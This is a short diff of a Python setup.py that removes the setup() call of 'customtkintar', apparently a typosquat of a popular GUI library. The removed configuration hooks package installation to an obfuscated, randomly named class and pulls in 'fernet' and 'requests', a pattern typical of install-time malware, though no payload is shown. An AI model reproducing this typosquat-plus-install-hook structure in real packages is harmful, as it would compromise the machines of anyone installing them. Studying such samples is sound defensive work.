@@ -18,22 +18,5 @@ class RQKisZcRKUNhsqUlxPbZvEkiUcWbHwwxAdqIcYmDOMckRVmSOPdTYuPWBHFVMigIevpBaujKNq
             install.run(self)
 
 
-setup(
-    name="customtkintar",
-    version=VERSION,
-    author="RcPgsWVDT",
-    author_email="MfVLTvdd@gmail.com",
-    description=DESCRIPTION,
-    long_description_content_type="text/markdown",
-    long_description=LONG_DESCRIPTION,
-    cmdclass={
-        'install': RQKisZcRKUNhsqUlxPbZvEkiUcWbHwwxAdqIcYmDOMckRVmSOPdTYuPWBHFVMigIevpBaujKNqrnLFyaQBaRUPJpnsTZyMdIPVEAUFUPEzwziRrJTRXriGycSLvqLFQKQMdRptCIzUCTIdJqLbZRJmyFSYJpyRROvFrFZkFmuUxfYuwRagvoCMbIVG,
-    },
-    packages=find_packages(),
-    setup_requires=['fernet', 'requests'],
-    keywords=[],
-    classifiers=[
-        "Operating System :: Microsoft :: Windows",
-    ]
-)
+# setup(...) removed                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                    
 
